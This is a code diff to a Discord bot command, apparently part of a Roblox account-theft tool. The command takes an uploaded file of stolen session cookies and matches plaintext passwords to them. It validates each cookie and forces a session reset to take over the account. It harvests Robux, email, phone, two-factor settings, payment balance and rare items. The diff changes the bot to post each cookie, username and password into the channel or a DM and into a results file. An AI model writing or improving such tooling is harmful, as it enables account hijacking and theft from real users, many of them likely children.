@@ -13,9 +13,7 @@ import {
   buildInvalidCookieEmbed,
   buildIpLimitEmbed,
   buildProgressEmbed,
-  buildAccountEmbed,
 } from '../../lib/embed-helpers';
-import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
 import { logger } from '../../lib/logger';
 import type { Command } from './types';
 
@@ -40,18 +38,14 @@ function extractCookies(text: string): string[] {
   return result;
 }
 
-const GAMES = [
-  { name: 'Blox Fruits', universeId: 994732206 },
-  { name: 'Adopt Me', universeId: 383310974 },
-  { name: 'Steal a Brainrot', universeId: 7709344486 },
-  { name: 'Rivals', universeId: 6035872082 },
-];
-
 const data = new SlashCommandBuilder()
   .setName('check')
   .setDescription('Mass Checking File (Auto‑Reset)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
+  )
+  .addStringOption((opt) =>
+    opt.setName('delivery').setDescription('Send results to DMs? (D) or Server (S)').setRequired(false),
   ) as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -80,6 +74,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
+    const deliveryRaw = interaction.options.getString('delivery')?.toUpperCase() || 'S';
+    const delivery = deliveryRaw === 'D' ? 'dm' : 'server';
+
     await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
 
     let validCount = 0;
@@ -88,8 +85,19 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     let totalPending = 0;
     const outputLines: string[] = [];
 
+    const passwordMap = new Map<string, string>();
+    const lines = fileContent.split(/\r?\n/);
+    let currentUser = '';
+    for (const line of lines) {
+      const userMatch = line.match(/^Username:\s*(.+)/i);
+      if (userMatch) currentUser = userMatch[1].trim();
+      const passMatch = line.match(/^Password:\s*(.+)/i);
+      if (passMatch && currentUser) {
+        passwordMap.set(currentUser.toLowerCase(), passMatch[1].trim());
+      }
+    }
+
     for (const rawCookie of cookies) {
-      // Step 1: Validate
       const validation = await Roblox.validateCookie(rawCookie);
       if (!validation.valid) {
         invalidCount++;
@@ -99,9 +107,13 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       validCount++;
       const userId = String(validation.userId!);
       const username = validation.username!;
-      const displayName = validation.displayName || null;
 
-      // Step 2: Fetch account data using the ORIGINAL cookie
+      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
+      let workingCookie = rawCookie;
+      if (resetResult.success && resetResult.newCookie) {
+        workingCookie = resetResult.newCookie;
+      }
+
       const [
         ageData, ageGroup,
         robux, summary, country, email, parental, thumb,
@@ -109,109 +121,51 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         pendingRobux, ownedRares,
       ] = await Promise.all([
         Roblox.getUserAge(validation.userId!),
-        Roblox.fetchAgeGroup(rawCookie),
-        Roblox.fetchRobux(rawCookie, userId),
-        Roblox.fetchTransactionTotals(rawCookie, userId),
-        Roblox.fetchCountry(rawCookie),
-        Roblox.fetchEmailInfo(rawCookie),
-        Roblox.fetchParentalControls(rawCookie),
+        Roblox.fetchAgeGroup(workingCookie),
+        Roblox.fetchRobux(workingCookie, userId),
+        Roblox.fetchTransactionTotals(workingCookie, userId),
+        Roblox.fetchCountry(workingCookie),
+        Roblox.fetchEmailInfo(workingCookie),
+        Roblox.fetchParentalControls(workingCookie),
         Roblox.fetchAvatarThumbnail(userId),
-        Roblox.fetchCreditBalance(rawCookie),
-        Roblox.fetchTwoStepConfig(rawCookie, userId),
-        Roblox.fetchPhoneInfo(rawCookie),
+        Roblox.fetchCreditBalance(workingCookie),
+        Roblox.fetchTwoStepConfig(workingCookie, userId),
+        Roblox.fetchPhoneInfo(workingCookie),
         Roblox.fetchRolimonsRAP(userId),
-        Roblox.fetchPendingRobux(rawCookie, userId),
-        Roblox.getOwnedRareItems(rawCookie, userId),
+        Roblox.fetchPendingRobux(workingCookie, userId),
+        Roblox.getOwnedRareItems(workingCookie, userId),
       ]);
 
       totalRobux += robux;
       totalPending += pendingRobux;
 
-      // Step 3: Reset to get fresh cookie (optional, after data fetched)
-      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
-      let workingCookie = rawCookie;
-      let resetNote = '';
-      if (resetResult.success && resetResult.newCookie) {
-        workingCookie = resetResult.newCookie;
-        resetNote = '✅ Reset successful';
-      } else {
-        resetNote = '⚠️ Reset failed, using old cookie';
-      }
+      const password = passwordMap.get(username.toLowerCase()) || 'N/A';
 
-      const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;
+      const embed = buildSuccessEmbed(`\`\`\`\n${workingCookie}\n\`\`\``);
+      embed.setDescription(`**Username:** ${username}\n**Password:** ${password}`);
+      if (thumb) embed.setThumbnail(thumb);
 
-      const twoStepStatus = `\`\`\`📧 Email 2FA ${twoStep.email ? '✅' : '❌'} | 🔐 Authenticator ${twoStep.authenticator ? '✅' : '❌'}\`\`\``;
-      const phoneStatus = `\`\`\`${phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone'}\`\`\``;
-      const balance = `\`\`\`${credit.balance} ${credit.currency}\`\`\``;
-      const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
-      const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;
-      const pendingValue = `\`\`\`${pendingRobux.toLocaleString()}\`\`\``;
-      const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';
-
-      let emailStatus = 'No email found';
-      if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
-      else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
-
-      const gamepassLines: string[] = [];
-      for (const game of GAMES) {
+      if (delivery === 'dm') {
         try {
-          const passes = await Roblox.getGamepasses(game.universeId);
-          for (const gp of passes) {
-            const owns = await Roblox.checkOwnsGamepass(rawCookie, userId, gp.id);
-            if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
-          }
-        } catch {}
+          await interaction.user.send({ embeds: [embed] });
+        } catch {
+          await interaction.channel?.send({ embeds: [embed] });
+        }
+      } else {
+        await interaction.channel?.send({ embeds: [embed] });
       }
-      const gpText = gamepassLines.length ? `\`\`\`${gamepassLines.join('\n')}\`\`\`` : '`None`';
 
-      const embed = buildAccountEmbed(
-        username,
-        displayName,
-        validation.userId!,
-        ageString,
-        robux,
-        summary,
-        country,
-        emailStatus,
-        parental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
-        thumb
+      outputLines.push(
+        `Username: ${username} | Password: ${password} | UserID: ${userId} | Robux: ${robux} | Pending: ${pendingRobux} | Country: ${country} | RAP: ${rap.rap ?? 'N/A'} | Premium: ${rap.premium ? 'Yes' : 'No'} | Email: ${email.verified || 'None'} | Phone: ${phone.hasPhone ? (phone.verified ? 'Verified' : 'Unverified') : 'No'} | 2FA: ${twoStep.email ? 'Email' : ''}${twoStep.authenticator ? ' Auth' : ''} | Rare: ${ownedRares.join(', ') || 'None'}`
       );
-
-      embed.addFields(
-        { name: '💳 Balance', value: balance, inline: true },
-        { name: '📞 Phone', value: phoneStatus, inline: true },
-        { name: '🔐 2FA', value: twoStepStatus, inline: false },
-        { name: '📈 RAP', value: rapValue, inline: true },
-        { name: '⭐ Premium', value: premiumValue, inline: true },
-        { name: '⏳ Pending Robux', value: pendingValue, inline: true },
-        { name: '🎒 Rare Items', value: rareText, inline: false },
-        { name: '🎮 Gamepasses', value: gpText, inline: false },
-        { name: '🔄 Reset Status', value: `\`\`\`${resetNote}\`\`\``, inline: false }
-      );
-
-      const id = Math.random().toString(36).slice(2, 10);
-      const row = buildCopyButtons(id, 'check', workingCookie, false);
-
-      outputLines.push(`Username: ${username} | UserID: ${userId} | Cookie: ${workingCookie}`);
-
-      await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
 
     const totalCookies = cookies.length;
     const summaryText =
-      `✧ **Results**\n` +
-      `────\n` +
-      `⭑ **Total cookies:** ${totalCookies}\n` +
-      `⭑ **Valid:** ${validCount}\n` +
-      `⭑ **Invalid:** ${invalidCount}\n` +
-      `⭑ **Total Robux (valid):** ${totalRobux.toLocaleString()}\n` +
-      `⭑ **Total Pending Robux (valid):** ${totalPending.toLocaleString()}`;
+      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}`;
 
     const summaryEmbed = buildSuccessEmbed(summaryText);
-
-    const fileContentOutput = outputLines.length
-      ? outputLines.join('\n')
-      : 'No valid cookies found.';
+    const fileContentOutput = outputLines.join('\n') || 'No valid cookies found.';
     const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
     const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });
 
@@ -222,14 +176,14 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     });
   } catch (err: any) {
     logger.error({ err }, 'Check command error');
-    await interaction.editReply({
-      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
-    });
+    try {
+      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
+    } catch {}
   }
 }
 
 async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
-  if (await handleCopyButtonClick(interaction)) return;
+  
 }
 
 export const checkCommand: Command = { data, execute, handleButton };
